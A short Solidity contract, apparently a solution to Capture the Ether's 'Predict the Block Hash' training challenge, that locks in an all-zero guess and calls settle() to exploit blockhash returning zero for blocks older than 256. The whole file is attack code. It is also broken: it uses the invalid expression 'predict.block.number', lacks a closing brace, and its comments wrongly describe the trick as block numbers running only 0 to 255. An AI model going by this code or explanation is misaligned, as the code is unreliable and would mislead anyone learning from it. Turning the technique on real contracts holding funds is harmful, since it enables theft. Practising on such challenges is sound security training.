pragma solidity ^0.4.21;

//                        *****SOLVED***** 
//  https://capturetheether.com/challenges/lotteries/predict-the-block-hash/
//           ^^^^^^^^^^^^ CAPTURE ETH HERE ^^^^^^^^^^^^^^

contract CaptureTheEther {
    PredictTheBlockHashChallenge predict = PredictTheBlockHashChallenge(/* INSERT CONTRACT ADDRESS */);
    bytes32 exploit = 0x0000000000000000000000000000000000000000000000000000000000000000;
    
    //Wait until all 256 blocks go through, then the settlementBlockNumber variable will default to zero's
    function capture() public payable {
        predict.lockInGuess.value(msg.value)(exploit); // initiallize the guess() function to the hash variable 'exploit'
        
        // block.number > 256 wouldn't work because there is no 257th block.
        // There also isn't a 256 block, blocks go from 0 - 255, making it 256 in total.
        require(predict.block.number == 255);
        
        predict.settle(); // Once all 256 blocks pass, pass the 'exploit' variable through the settle() function 
}
